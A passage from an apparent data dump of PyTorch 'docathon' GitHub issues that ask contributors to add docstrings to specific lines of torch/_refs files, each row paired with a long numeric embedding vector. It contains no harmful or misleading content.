 -3.46054673e-01 -5.19460201e-01 -8.21878314e-02 -3.34102176e-02
 -9.31323022e-02 -2.08592728e-01 -2.14449376e-01 -3.11297923e-01
  2.02441871e-01  3.26310277e-01 -4.53196108e-01  1.75224040e-02
 -7.74733126e-02  1.97217181e-01 -4.23801422e-01  1.70498848e-01
  1.85439065e-02  2.75060654e-01  2.34175518e-01 -2.64781211e-02
  1.79726422e-01 -1.34660363e-01 -2.40009457e-01 -7.81643987e-02
 -9.26376730e-02  1.32006198e-01  5.68260103e-02  3.22780199e-03
  1.77675746e-02  3.05755362e-02 -1.03349000e-01 -3.28961790e-01
 -3.57606292e-01  5.05570546e-02  7.75654614e-02  5.37099503e-03
 -5.09074479e-02  6.62788302e-02  6.24384508e-02  1.25254378e-01
  1.69841722e-02 -3.90906930e-01  1.22695707e-01  2.70669609e-01
  4.22088027e-01  3.83970439e-01  7.85249472e-02 -7.29241371e-02
 -2.95089543e-01  1.17290206e-01  1.88682586e-01 -1.00878112e-01
  1.28416359e-01  2.08841518e-01  1.34372920e-01 -7.11789355e-02
  1.20860748e-01 -1.37122020e-01 -1.46252140e-01  1.56555712e-01
  3.48669849e-02  2.60239780e-01 -3.51073265e-01  3.29828799e-01
 -3.35057199e-01  2.23408356e-01  8.14721808e-02 -3.19230836e-04
  5.90455770e-01  7.43510276e-02 -2.47388929e-01 -4.10894930e-01
 -2.54831612e-01  4.10358831e-02 -9.72964764e-02  2.83683658e-01
  1.45393431e-01 -3.16430092e-01 -2.77405083e-01  4.42191809e-01
 -2.84133162e-02 -1.43107206e-01  1.23514019e-01 -1.13313206e-01
 -3.01838994e-01 -1.26086116e-01  2.12404560e-02 -3.30847651e-01
  1.82728812e-01  5.98171428e-02 -2.36590534e-01  1.55993253e-01
 -9.27777812e-02  8.49202424e-02 -1.16443515e-01 -2.72273332e-01
  7.29686499e-01 -1.18528768e-01  2.52392471e-01  7.84103051e-02
 -8.74011666e-02 -1.66017056e-01 -2.93148041e-01  2.14035213e-02
 -2.84302950e-01 -4.78951633e-02 -7.41205215e-02 -1.08915105e-01
  1.53924555e-01 -1.30165756e-01 -1.17874764e-01 -1.82245269e-01
 -1.50156379e-01  1.10511541e-01 -2.01839596e-01 -3.27361405e-01
 -1.21010169e-02  5.02802432e-02  3.23028356e-01  1.80900425e-01
 -3.43927205e-01 -9.02872831e-02 -8.52345824e-02 -5.63989952e-02
 -5.44571318e-04  2.31372386e-01 -1.60994947e-01  3.46990049e-01
  4.42163050e-01 -2.11721510e-02  7.92802051e-02  7.99374431e-02
 -2.00454891e-01 -2.61788368e-01  2.52169013e-01 -2.48608530e-01
  2.62872279e-01  3.13544691e-01  1.42012209e-01  9.34583396e-02
  1.34801790e-01 -1.76309496e-01 -4.65184487e-02 -6.49117902e-02
 -9.12238061e-02 -3.39796245e-02 -4.25603151e-01  4.14306410e-02
  2.20762670e-01 -1.80100292e-01  1.46412887e-02 -1.16157606e-01
 -1.57549933e-01 -1.30525544e-01 -2.15643167e-01 -3.90693769e-02
  1.24601498e-01  3.00489590e-02  1.00226596e-01 -1.75688773e-01
 -3.77082676e-02  5.18131740e-02  4.60446000e-01  1.34565353e-01
 -2.70891666e-01 -1.84286818e-01 -1.67791098e-01  2.82064021e-01
  7.01599419e-02  1.44059449e-01  5.95807135e-02  1.66874856e-01
  3.21703196e-01 -1.48408785e-01  2.99559981e-01  4.83371437e-01
 -2.94880897e-01  3.29860985e-01 -2.71542668e-01  6.76554963e-02
 -7.56690279e-04  3.74248624e-01 -2.49428868e-01  4.50944304e-02
 -5.45853041e-02 -1.05682798e-01 -5.84659278e-01  1.33849308e-03
  1.31237030e-01 -5.80094522e-03 -5.93638957e-01  2.47729510e-01
 -4.50383663e-01 -3.38510990e-01  9.75767225e-02  1.27070129e-01
 -3.29743624e-01 -2.07209170e-01 -1.32058322e-01 -4.18188311e-02
  1.11826517e-01  2.07104608e-02 -1.11313827e-01 -9.57485735e-02
 -6.57082945e-02  8.82218629e-02  1.03920855e-01 -1.22595295e-01
 -1.80441841e-01 -1.83621123e-02  1.24335945e-01  5.10487199e-01
 -1.58402175e-02  1.20340332e-01  4.48934972e-01  3.23469698e-01
 -2.40006894e-01 -8.22252594e-03 -1.75762966e-01  2.68034577e-01
  2.04680413e-02  3.81613851e-01 -3.48793566e-02  5.10810137e-01
 -3.17896187e-01  1.21100377e-02 -2.34484822e-01  6.06141649e-02
 -5.11811152e-02 -1.96889818e-01  4.39819917e-02  1.54068649e-01
  8.84329826e-02  1.30695269e-01 -1.19699482e-02  7.49131590e-02
  9.34201628e-02  3.72928739e-01  2.84382887e-02  1.74105018e-01
  4.19823974e-01 -7.48999417e-02  1.12520784e-01 -3.09092581e-01
 -3.31357360e-01 -5.09998165e-02  3.18126649e-01  2.31914520e-01]"
Add Docstrings to ./torch/_refs/__init__.py module: docs triaged medium docathon-h2-2023,"Add docstrings on the following lines. Follow these [docstring guidelines](https://github.com/pytorch/pytorch/blob/main/CONTRIBUTING.md#docstring-type-formatting). A docstring should have:
* A short one-sentence description in imperative mode.
* A longer description.
* A list of associated Args.
* A return value (for functions)
* An example
Follow the existing patterns in the file you are editing. After adding the docstring, run:
```
lintrunner -a
```
- **File**: `./torch/_refs/__init__.py`, **Line**: 1361
- **File**: `./torch/_refs/__init__.py`, **Line**: 1371
- **File**: `./torch/_refs/__init__.py`, **Line**: 1381
- **File**: `./torch/_refs/__init__.py`, **Line**: 1390
- **File**: `./torch/_refs/__init__.py`, **Line**: 1504

cc @carljparker",False,"[-7.23148286e-02  3.89273316e-02  4.55345958e-03 -8.91592950e-02
 -9.43444818e-02  3.50120012e-04 -1.50771439e-01  6.05069622e-02
 -3.33087742e-01  1.57290041e-01 -3.24731022e-01  2.87611425e-01
 -3.66544351e-02  1.40772551e-01 -7.87723064e-02  4.59123738e-02
 -2.95520425e-01 -4.74924594e-02 -9.29562449e-02  1.30999774e-01
  1.53009102e-01  5.55932403e-01 -2.14208364e-01  8.78652483e-02
  1.77175790e-01  7.18023404e-02 -4.81935740e-01 -2.29387134e-01
 -3.07155270e-02  1.64099142e-01  1.84926197e-01  2.87526309e-01
 -6.94214851e-02  5.46153970e-02  2.56145358e-01  1.32819593e-01
  2.22494304e-01  2.73264468e-01  9.21734516e-03  6.79727271e-02
  5.62386885e-02  2.40388438e-02 -2.60687739e-01  3.09935093e-01
 -9.66107175e-02 -3.99327099e-01 -2.78906256e-01  5.15076295e-02
 -1.15082920e-01  1.62481785e-01 -5.64629555e-01 -4.48421724e-02
 -4.39615309e-01  3.13579977e-01 -1.01640053e-01 -1.51568532e-01
 -1.24524876e-01  4.40931082e-01  2.13774934e-01 -2.16325581e-01
  6.25469722e-04  5.63943684e-02  2.10718423e-01  2.32813239e-01
 -1.36653841e-01  3.40682089e-01 -1.60915211e-01  2.55607575e-01
  2.43899465e-01  8.62871259e-02 -1.85048997e-01 -1.31979838e-01
 -2.02002674e-01 -2.56226331e-01 -1.37861390e-02 -1.99848190e-02
 -2.80462503e-01  1.56970188e-01 -4.31293212e-02 -2.23183453e-01
 -6.42524809e-02  4.21404615e-02 -1.38538644e-01  3.04147840e-01
  2.33567711e-02 -6.83726370e-02  1.51702046e-01 -6.15043044e-02
  2.36955956e-01  1.30055472e-01  1.38886929e-01 -2.29337066e-01
  3.33808810e-01  2.40306780e-01  1.35081217e-01  1.06634006e-01
  6.47737831e-03 -4.43778560e-02  1.02669150e-02 -2.24683940e-01
 -1.75663263e-01 -4.20530200e-01 -6.74690902e-02 -1.30486906e-01
  4.70483899e-02 -3.23137105e-01  5.91735318e-02  5.74710891e-02
  9.66773257e-02 -1.97599202e-01  2.02407941e-01  7.33903870e-02
 -3.57933901e-03 -2.92372286e-01 -1.27421379e-01  8.95231366e-02
  9.04124882e-03 -1.36015117e-01  1.78599972e-02  1.91367209e-01
  1.99953884e-01  3.56821716e-01 -6.73655123e-02  1.57923847e-01
  1.32369697e-01  8.11474025e-02  2.10293010e-02  4.24529538e-02
  1.59240454e-01  3.66523974e-02 -7.50637613e-03  4.44512889e-02
 -1.78625733e-02  2.18076244e-01  2.90850967e-01 -8.94843042e-02
 -3.46054673e-01 -5.19460201e-01 -8.21878314e-02 -3.34102176e-02
 -9.31323022e-02 -2.08592728e-01 -2.14449376e-01 -3.11297923e-01
  2.02441871e-01  3.26310277e-01 -4.53196108e-01  1.75224040e-02
 -7.74733126e-02  1.97217181e-01 -4.23801422e-01  1.70498848e-01
  1.85439065e-02  2.75060654e-01  2.34175518e-01 -2.64781211e-02
  1.79726422e-01 -1.34660363e-01 -2.40009457e-01 -7.81643987e-02
 -9.26376730e-02  1.32006198e-01  5.68260103e-02  3.22780199e-03
  1.77675746e-02  3.05755362e-02 -1.03349000e-01 -3.28961790e-01
 -3.57606292e-01  5.05570546e-02  7.75654614e-02  5.37099503e-03
 -5.09074479e-02  6.62788302e-02  6.24384508e-02  1.25254378e-01
  1.69841722e-02 -3.90906930e-01  1.22695707e-01  2.70669609e-01
  4.22088027e-01  3.83970439e-01  7.85249472e-02 -7.29241371e-02
 -2.95089543e-01  1.17290206e-01  1.88682586e-01 -1.00878112e-01
  1.28416359e-01  2.08841518e-01  1.34372920e-01 -7.11789355e-02
  1.20860748e-01 -1.37122020e-01 -1.46252140e-01  1.56555712e-01
  3.48669849e-02  2.60239780e-01 -3.51073265e-01  3.29828799e-01
 -3.35057199e-01  2.23408356e-01  8.14721808e-02 -3.19230836e-04
  5.90455770e-01  7.43510276e-02 -2.47388929e-01 -4.10894930e-01
 -2.54831612e-01  4.10358831e-02 -9.72964764e-02  2.83683658e-01
  1.45393431e-01 -3.16430092e-01 -2.77405083e-01  4.42191809e-01
 -2.84133162e-02 -1.43107206e-01  1.23514019e-01 -1.13313206e-01
 -3.01838994e-01 -1.26086116e-01  2.12404560e-02 -3.30847651e-01
  1.82728812e-01  5.98171428e-02 -2.36590534e-01  1.55993253e-01
 -9.27777812e-02  8.49202424e-02 -1.16443515e-01 -2.72273332e-01
  7.29686499e-01 -1.18528768e-01  2.52392471e-01  7.84103051e-02
 -8.74011666e-02 -1.66017056e-01 -2.93148041e-01  2.14035213e-02
 -2.84302950e-01 -4.78951633e-02 -7.41205215e-02 -1.08915105e-01
  1.53924555e-01 -1.30165756e-01 -1.17874764e-01 -1.82245269e-01
 -1.50156379e-01  1.10511541e-01 -2.01839596e-01 -3.27361405e-01
 -1.21010169e-02  5.02802432e-02  3.23028356e-01  1.80900425e-01
 -3.43927205e-01 -9.02872831e-02 -8.52345824e-02 -5.63989952e-02
 -5.44571318e-04  2.31372386e-01 -1.60994947e-01  3.46990049e-01
  4.42163050e-01 -2.11721510e-02  7.92802051e-02  7.99374431e-02
 -2.00454891e-01 -2.61788368e-01  2.52169013e-01 -2.48608530e-01
  2.62872279e-01  3.13544691e-01  1.42012209e-01  9.34583396e-02
  1.34801790e-01 -1.76309496e-01 -4.65184487e-02 -6.49117902e-02
 -9.12238061e-02 -3.39796245e-02 -4.25603151e-01  4.14306410e-02
  2.20762670e-01 -1.80100292e-01  1.46412887e-02 -1.16157606e-01
 -1.57549933e-01 -1.30525544e-01 -2.15643167e-01 -3.90693769e-02
  1.24601498e-01  3.00489590e-02  1.00226596e-01 -1.75688773e-01
 -3.77082676e-02  5.18131740e-02  4.60446000e-01  1.34565353e-01
 -2.70891666e-01 -1.84286818e-01 -1.67791098e-01  2.82064021e-01
  7.01599419e-02  1.44059449e-01  5.95807135e-02  1.66874856e-01
  3.21703196e-01 -1.48408785e-01  2.99559981e-01  4.83371437e-01
 -2.94880897e-01  3.29860985e-01 -2.71542668e-01  6.76554963e-02
 -7.56690279e-04  3.74248624e-01 -2.49428868e-01  4.50944304e-02
 -5.45853041e-02 -1.05682798e-01 -5.84659278e-01  1.33849308e-03
  1.31237030e-01 -5.80094522e-03 -5.93638957e-01  2.47729510e-01
 -4.50383663e-01 -3.38510990e-01  9.75767225e-02  1.27070129e-01
 -3.29743624e-01 -2.07209170e-01 -1.32058322e-01 -4.18188311e-02
  1.11826517e-01  2.07104608e-02 -1.11313827e-01 -9.57485735e-02
 -6.57082945e-02  8.82218629e-02  1.03920855e-01 -1.22595295e-01
 -1.80441841e-01 -1.83621123e-02  1.24335945e-01  5.10487199e-01
 -1.58402175e-02  1.20340332e-01  4.48934972e-01  3.23469698e-01
 -2.40006894e-01 -8.22252594e-03 -1.75762966e-01  2.68034577e-01
  2.04680413e-02  3.81613851e-01 -3.48793566e-02  5.10810137e-01
 -3.17896187e-01  1.21100377e-02 -2.34484822e-01  6.06141649e-02
 -5.11811152e-02 -1.96889818e-01  4.39819917e-02  1.54068649e-01
  8.84329826e-02  1.30695269e-01 -1.19699482e-02  7.49131590e-02
  9.34201628e-02  3.72928739e-01  2.84382887e-02  1.74105018e-01
  4.19823974e-01 -7.48999417e-02  1.12520784e-01 -3.09092581e-01
 -3.31357360e-01 -5.09998165e-02  3.18126649e-01  2.31914520e-01]"
Add Docstrings to ./torch/_refs/__init__.py module: docs triaged medium docathon-h2-2023,"Add docstrings on the following lines. Follow these [docstring guidelines](https://github.com/pytorch/pytorch/blob/main/CONTRIBUTING.md#docstring-type-formatting). A docstring should have:
* A short one-sentence description in imperative mode.
* A longer description.
* A list of associated Args.
* A return value (for functions)
* An example
Follow the existing patterns in the file you are editing. After adding the docstring, run:
```
lintrunner -a
```
- **File**: `./torch/_refs/__init__.py`, **Line**: 1183
- **File**: `./torch/_refs/__init__.py`, **Line**: 1211
- **File**: `./torch/_refs/__init__.py`, **Line**: 1269
- **File**: `./torch/_refs/__init__.py`, **Line**: 1341
- **File**: `./torch/_refs/__init__.py`, **Line**: 1351

cc @carljparker",False,"[-7.23148286e-02  3.89273316e-02  4.55345958e-03 -8.91592950e-02
 -9.43444818e-02  3.50120012e-04 -1.50771439e-01  6.05069622e-02
 -3.33087742e-01  1.57290041e-01 -3.24731022e-01  2.87611425e-01
 -3.66544351e-02  1.40772551e-01 -7.87723064e-02  4.59123738e-02
 -2.95520425e-01 -4.74924594e-02 -9.29562449e-02  1.30999774e-01
  1.53009102e-01  5.55932403e-01 -2.14208364e-01  8.78652483e-02
  1.77175790e-01  7.18023404e-02 -4.81935740e-01 -2.29387134e-01
 -3.07155270e-02  1.64099142e-01  1.84926197e-01  2.87526309e-01
 -6.94214851e-02  5.46153970e-02  2.56145358e-01  1.32819593e-01
  2.22494304e-01  2.73264468e-01  9.21734516e-03  6.79727271e-02
  5.62386885e-02  2.40388438e-02 -2.60687739e-01  3.09935093e-01
 -9.66107175e-02 -3.99327099e-01 -2.78906256e-01  5.15076295e-02
 -1.15082920e-01  1.62481785e-01 -5.64629555e-01 -4.48421724e-02
 -4.39615309e-01  3.13579977e-01 -1.01640053e-01 -1.51568532e-01
 -1.24524876e-01  4.40931082e-01  2.13774934e-01 -2.16325581e-01
  6.25469722e-04  5.63943684e-02  2.10718423e-01  2.32813239e-01
 -1.36653841e-01  3.40682089e-01 -1.60915211e-01  2.55607575e-01
  2.43899465e-01  8.62871259e-02 -1.85048997e-01 -1.31979838e-01
 -2.02002674e-01 -2.56226331e-01 -1.37861390e-02 -1.99848190e-02
 -2.80462503e-01  1.56970188e-01 -4.31293212e-02 -2.23183453e-01
 -6.42524809e-02  4.21404615e-02 -1.38538644e-01  3.04147840e-01
  2.33567711e-02 -6.83726370e-02  1.51702046e-01 -6.15043044e-02
  2.36955956e-01  1.30055472e-01  1.38886929e-01 -2.29337066e-01
  3.33808810e-01  2.40306780e-01  1.35081217e-01  1.06634006e-01
  6.47737831e-03 -4.43778560e-02  1.02669150e-02 -2.24683940e-01
 -1.75663263e-01 -4.20530200e-01 -6.74690902e-02 -1.30486906e-01
  4.70483899e-02 -3.23137105e-01  5.91735318e-02  5.74710891e-02
  9.66773257e-02 -1.97599202e-01  2.02407941e-01  7.33903870e-02
 -3.57933901e-03 -2.92372286e-01 -1.27421379e-01  8.95231366e-02
  9.04124882e-03 -1.36015117e-01  1.78599972e-02  1.91367209e-01
  1.99953884e-01  3.56821716e-01 -6.73655123e-02  1.57923847e-01
  1.32369697e-01  8.11474025e-02  2.10293010e-02  4.24529538e-02
  1.59240454e-01  3.66523974e-02 -7.50637613e-03  4.44512889e-02
 -1.78625733e-02  2.18076244e-01  2.90850967e-01 -8.94843042e-02
 -3.46054673e-01 -5.19460201e-01 -8.21878314e-02 -3.34102176e-02
 -9.31323022e-02 -2.08592728e-01 -2.14449376e-01 -3.11297923e-01
  2.02441871e-01  3.26310277e-01 -4.53196108e-01  1.75224040e-02
 -7.74733126e-02  1.97217181e-01 -4.23801422e-01  1.70498848e-01
  1.85439065e-02  2.75060654e-01  2.34175518e-01 -2.64781211e-02
  1.79726422e-01 -1.34660363e-01 -2.40009457e-01 -7.81643987e-02
 -9.26376730e-02  1.32006198e-01  5.68260103e-02  3.22780199e-03
  1.77675746e-02  3.05755362e-02 -1.03349000e-01 -3.28961790e-01
 -3.57606292e-01  5.05570546e-02  7.75654614e-02  5.37099503e-03
 -5.09074479e-02  6.62788302e-02  6.24384508e-02  1.25254378e-01
  1.69841722e-02 -3.90906930e-01  1.22695707e-01  2.70669609e-01
  4.22088027e-01  3.83970439e-01  7.85249472e-02 -7.29241371e-02
 -2.95089543e-01  1.17290206e-01  1.88682586e-01 -1.00878112e-01
  1.28416359e-01  2.08841518e-01  1.34372920e-01 -7.11789355e-02
  1.20860748e-01 -1.37122020e-01 -1.46252140e-01  1.56555712e-01
  3.48669849e-02  2.60239780e-01 -3.51073265e-01  3.29828799e-01
 -3.35057199e-01  2.23408356e-01  8.14721808e-02 -3.19230836e-04
  5.90455770e-01  7.43510276e-02 -2.47388929e-01 -4.10894930e-01
 -2.54831612e-01  4.10358831e-02 -9.72964764e-02  2.83683658e-01
  1.45393431e-01 -3.16430092e-01 -2.77405083e-01  4.42191809e-01
 -2.84133162e-02 -1.43107206e-01  1.23514019e-01 -1.13313206e-01
 -3.01838994e-01 -1.26086116e-01  2.12404560e-02 -3.30847651e-01
  1.82728812e-01  5.98171428e-02 -2.36590534e-01  1.55993253e-01
 -9.27777812e-02  8.49202424e-02 -1.16443515e-01 -2.72273332e-01
  7.29686499e-01 -1.18528768e-01  2.52392471e-01  7.84103051e-02
 -8.74011666e-02 -1.66017056e-01 -2.93148041e-01  2.14035213e-02
 -2.84302950e-01 -4.78951633e-02 -7.41205215e-02 -1.08915105e-01
  1.53924555e-01 -1.30165756e-01 -1.17874764e-01 -1.82245269e-01
 -1.50156379e-01  1.10511541e-01 -2.01839596e-01 -3.27361405e-01
 -1.21010169e-02  5.02802432e-02  3.23028356e-01  1.80900425e-01
 -3.43927205e-01 -9.02872831e-02 -8.52345824e-02 -5.63989952e-02
 -5.44571318e-04  2.31372386e-01 -1.60994947e-01  3.46990049e-01
  4.42163050e-01 -2.11721510e-02  7.92802051e-02  7.99374431e-02
 -2.00454891e-01 -2.61788368e-01  2.52169013e-01 -2.48608530e-01
  2.62872279e-01  3.13544691e-01  1.42012209e-01  9.34583396e-02
  1.34801790e-01 -1.76309496e-01 -4.65184487e-02 -6.49117902e-02
 -9.12238061e-02 -3.39796245e-02 -4.25603151e-01  4.14306410e-02
  2.20762670e-01 -1.80100292e-01  1.46412887e-02 -1.16157606e-01
 -1.57549933e-01 -1.30525544e-01 -2.15643167e-01 -3.90693769e-02
  1.24601498e-01  3.00489590e-02  1.00226596e-01 -1.75688773e-01
 -3.77082676e-02  5.18131740e-02  4.60446000e-01  1.34565353e-01
 -2.70891666e-01 -1.84286818e-01 -1.67791098e-01  2.82064021e-01
  7.01599419e-02  1.44059449e-01  5.95807135e-02  1.66874856e-01
  3.21703196e-01 -1.48408785e-01  2.99559981e-01  4.83371437e-01
 -2.94880897e-01  3.29860985e-01 -2.71542668e-01  6.76554963e-02
 -7.56690279e-04  3.74248624e-01 -2.49428868e-01  4.50944304e-02
 -5.45853041e-02 -1.05682798e-01 -5.84659278e-01  1.33849308e-03
  1.31237030e-01 -5.80094522e-03 -5.93638957e-01  2.47729510e-01
 -4.50383663e-01 -3.38510990e-01  9.75767225e-02  1.27070129e-01
 -3.29743624e-01 -2.07209170e-01 -1.32058322e-01 -4.18188311e-02
  1.11826517e-01  2.07104608e-02 -1.11313827e-01 -9.57485735e-02
 -6.57082945e-02  8.82218629e-02  1.03920855e-01 -1.22595295e-01
 -1.80441841e-01 -1.83621123e-02  1.24335945e-01  5.10487199e-01
 -1.58402175e-02  1.20340332e-01  4.48934972e-01  3.23469698e-01
 -2.40006894e-01 -8.22252594e-03 -1.75762966e-01  2.68034577e-01
  2.04680413e-02  3.81613851e-01 -3.48793566e-02  5.10810137e-01
 -3.17896187e-01  1.21100377e-02 -2.34484822e-01  6.06141649e-02
 -5.11811152e-02 -1.96889818e-01  4.39819917e-02  1.54068649e-01
  8.84329826e-02  1.30695269e-01 -1.19699482e-02  7.49131590e-02
  9.34201628e-02  3.72928739e-01  2.84382887e-02  1.74105018e-01
  4.19823974e-01 -7.48999417e-02  1.12520784e-01 -3.09092581e-01
 -3.31357360e-01 -5.09998165e-02  3.18126649e-01  2.31914520e-01]"
Add Docstrings to ./torch/_refs/__init__.py module: docs triaged medium docathon-h2-2023,"Add docstrings on the following lines. Follow these [docstring guidelines](https://github.com/pytorch/pytorch/blob/main/CONTRIBUTING.md#docstring-type-formatting). A docstring should have:
* A short one-sentence description in imperative mode.
* A longer description.
* A list of associated Args.
* A return value (for functions)
* An example
Follow the existing patterns in the file you are editing. After adding the docstring, run:
```
lintrunner -a
```
- **File**: `./torch/_refs/__init__.py`, **Line**: 1114
- **File**: `./torch/_refs/__init__.py`, **Line**: 1122
- **File**: `./torch/_refs/__init__.py`, **Line**: 1130
- **File**: `./torch/_refs/__init__.py`, **Line**: 1148
- **File**: `./torch/_refs/__init__.py`, **Line**: 1174

cc @carljparker",False,"[-7.23148286e-02  3.89273316e-02  4.55345958e-03 -8.91592950e-02
 -9.43444818e-02  3.50120012e-04 -1.50771439e-01  6.05069622e-02
 -3.33087742e-01  1.57290041e-01 -3.24731022e-01  2.87611425e-01
 -3.66544351e-02  1.40772551e-01 -7.87723064e-02  4.59123738e-02
 -2.95520425e-01 -4.74924594e-02 -9.29562449e-02  1.30999774e-01
  1.53009102e-01  5.55932403e-01 -2.14208364e-01  8.78652483e-02
  1.77175790e-01  7.18023404e-02 -4.81935740e-01 -2.29387134e-01
 -3.07155270e-02  1.64099142e-01  1.84926197e-01  2.87526309e-01
 -6.94214851e-02  5.46153970e-02  2.56145358e-01  1.32819593e-01
  2.22494304e-01  2.73264468e-01  9.21734516e-03  6.79727271e-02
  5.62386885e-02  2.40388438e-02 -2.60687739e-01  3.09935093e-01
 -9.66107175e-02 -3.99327099e-01 -2.78906256e-01  5.15076295e-02
 -1.15082920e-01  1.62481785e-01 -5.64629555e-01 -4.48421724e-02
 -4.39615309e-01  3.13579977e-01 -1.01640053e-01 -1.51568532e-01
 -1.24524876e-01  4.40931082e-01  2.13774934e-01 -2.16325581e-01
  6.25469722e-04  5.63943684e-02  2.10718423e-01  2.32813239e-01
 -1.36653841e-01  3.40682089e-01 -1.60915211e-01  2.55607575e-01
  2.43899465e-01  8.62871259e-02 -1.85048997e-01 -1.31979838e-01
 -2.02002674e-01 -2.56226331e-01 -1.37861390e-02 -1.99848190e-02
 -2.80462503e-01  1.56970188e-01 -4.31293212e-02 -2.23183453e-01
 -6.42524809e-02  4.21404615e-02 -1.38538644e-01  3.04147840e-01
  2.33567711e-02 -6.83726370e-02  1.51702046e-01 -6.15043044e-02
  2.36955956e-01  1.30055472e-01  1.38886929e-01 -2.29337066e-01
  3.33808810e-01  2.40306780e-01  1.35081217e-01  1.06634006e-01
  6.47737831e-03 -4.43778560e-02  1.02669150e-02 -2.24683940e-01
 -1.75663263e-01 -4.20530200e-01 -6.74690902e-02 -1.30486906e-01
  4.70483899e-02 -3.23137105e-01  5.91735318e-02  5.74710891e-02
  9.66773257e-02 -1.97599202e-01  2.02407941e-01  7.33903870e-02
 -3.57933901e-03 -2.92372286e-01 -1.27421379e-01  8.95231366e-02
  9.04124882e-03 -1.36015117e-01  1.78599972e-02  1.91367209e-01
  1.99953884e-01  3.56821716e-01 -6.73655123e-02  1.57923847e-01
  1.32369697e-01  8.11474025e-02  2.10293010e-02  4.24529538e-02
  1.59240454e-01  3.66523974e-02 -7.50637613e-03  4.44512889e-02
 -1.78625733e-02  2.18076244e-01  2.90850967e-01 -8.94843042e-02
 -3.46054673e-01 -5.19460201e-01 -8.21878314e-02 -3.34102176e-02
 -9.31323022e-02 -2.08592728e-01 -2.14449376e-01 -3.11297923e-01
  2.02441871e-01  3.26310277e-01 -4.53196108e-01  1.75224040e-02
 -7.74733126e-02  1.97217181e-01 -4.23801422e-01  1.70498848e-01
  1.85439065e-02  2.75060654e-01  2.34175518e-01 -2.64781211e-02
  1.79726422e-01 -1.34660363e-01 -2.40009457e-01 -7.81643987e-02
 -9.26376730e-02  1.32006198e-01  5.68260103e-02  3.22780199e-03
  1.77675746e-02  3.05755362e-02 -1.03349000e-01 -3.28961790e-01
 -3.57606292e-01  5.05570546e-02  7.75654614e-02  5.37099503e-03
 -5.09074479e-02  6.62788302e-02  6.24384508e-02  1.25254378e-01
  1.69841722e-02 -3.90906930e-01  1.22695707e-01  2.70669609e-01
  4.22088027e-01  3.83970439e-01  7.85249472e-02 -7.29241371e-02
 -2.95089543e-01  1.17290206e-01  1.88682586e-01 -1.00878112e-01
  1.28416359e-01  2.08841518e-01  1.34372920e-01 -7.11789355e-02
  1.20860748e-01 -1.37122020e-01 -1.46252140e-01  1.56555712e-01
  3.48669849e-02  2.60239780e-01 -3.51073265e-01  3.29828799e-01
 -3.35057199e-01  2.23408356e-01  8.14721808e-02 -3.19230836e-04
  5.90455770e-01  7.43510276e-02 -2.47388929e-01 -4.10894930e-01
 -2.54831612e-01  4.10358831e-02 -9.72964764e-02  2.83683658e-01
  1.45393431e-01 -3.16430092e-01 -2.77405083e-01  4.42191809e-01
 -2.84133162e-02 -1.43107206e-01  1.23514019e-01 -1.13313206e-01
 -3.01838994e-01 -1.26086116e-01  2.12404560e-02 -3.30847651e-01
  1.82728812e-01  5.98171428e-02 -2.36590534e-01  1.55993253e-01
 -9.27777812e-02  8.49202424e-02 -1.16443515e-01 -2.72273332e-01
  7.29686499e-01 -1.18528768e-01  2.52392471e-01  7.84103051e-02
 -8.74011666e-02 -1.66017056e-01 -2.93148041e-01  2.14035213e-02
 -2.84302950e-01 -4.78951633e-02 -7.41205215e-02 -1.08915105e-01
  1.53924555e-01 -1.30165756e-01 -1.17874764e-01 -1.82245269e-01
 -1.50156379e-01  1.10511541e-01 -2.01839596e-01 -3.27361405e-01
 -1.21010169e-02  5.02802432e-02  3.23028356e-01  1.80900425e-01
 -3.43927205e-01 -9.02872831e-02 -8.52345824e-02 -5.63989952e-02
 -5.44571318e-04  2.31372386e-01 -1.60994947e-01  3.46990049e-01
  4.42163050e-01 -2.11721510e-02  7.92802051e-02  7.99374431e-02
 -2.00454891e-01 -2.61788368e-01  2.52169013e-01 -2.48608530e-01
  2.62872279e-01  3.13544691e-01  1.42012209e-01  9.34583396e-02
  1.34801790e-01 -1.76309496e-01 -4.65184487e-02 -6.49117902e-02
 -9.12238061e-02 -3.39796245e-02 -4.25603151e-01  4.14306410e-02
  2.20762670e-01 -1.80100292e-01  1.46412887e-02 -1.16157606e-01
 -1.57549933e-01 -1.30525544e-01 -2.15643167e-01 -3.90693769e-02
  1.24601498e-01  3.00489590e-02  1.00226596e-01 -1.75688773e-01
 -3.77082676e-02  5.18131740e-02  4.60446000e-01  1.34565353e-01
 -2.70891666e-01 -1.84286818e-01 -1.67791098e-01  2.82064021e-01
  7.01599419e-02  1.44059449e-01  5.95807135e-02  1.66874856e-01
  3.21703196e-01 -1.48408785e-01  2.99559981e-01  4.83371437e-01
 -2.94880897e-01  3.29860985e-01 -2.71542668e-01  6.76554963e-02
 -7.56690279e-04  3.74248624e-01 -2.49428868e-01  4.50944304e-02
 -5.45853041e-02 -1.05682798e-01 -5.84659278e-01  1.33849308e-03
  1.31237030e-01 -5.80094522e-03 -5.93638957e-01  2.47729510e-01
 -4.50383663e-01 -3.38510990e-01  9.75767225e-02  1.27070129e-01
 -3.29743624e-01 -2.07209170e-01 -1.32058322e-01 -4.18188311e-02
  1.11826517e-01  2.07104608e-02 -1.11313827e-01 -9.57485735e-02
 -6.57082945e-02  8.82218629e-02  1.03920855e-01 -1.22595295e-01
 -1.80441841e-01 -1.83621123e-02  1.24335945e-01  5.10487199e-01
 -1.58402175e-02  1.20340332e-01  4.48934972e-01  3.23469698e-01
 -2.40006894e-01 -8.22252594e-03 -1.75762966e-01  2.68034577e-01
  2.04680413e-02  3.81613851e-01 -3.48793566e-02  5.10810137e-01
 -3.17896187e-01  1.21100377e-02 -2.34484822e-01  6.06141649e-02
 -5.11811152e-02 -1.96889818e-01  4.39819917e-02  1.54068649e-01
  8.84329826e-02  1.30695269e-01 -1.19699482e-02  7.49131590e-02
  9.34201628e-02  3.72928739e-01  2.84382887e-02  1.74105018e-01
  4.19823974e-01 -7.48999417e-02  1.12520784e-01 -3.09092581e-01
 -3.31357360e-01 -5.09998165e-02  3.18126649e-01  2.31914520e-01]"
"Add Docstrings to ./torch/_refs/__init__.py, ./torch/_refs/special/__init__.py, ./torch/masked/_ops.py module: docs triaged medium docathon-h2-2023","Add docstrings on the following lines. Follow these [docstring guidelines](https://github.com/pytorch/pytorch/blob/main/CONTRIBUTING.md#docstring-type-formatting). A docstring should have:
* A short one-sentence description in imperative mode.
* A longer description.
* A list of associated Args.
* A return value (for functions)
* An example
Follow the existing patterns in the file you are editing. After adding the docstring, run:
```
lintrunner -a
```
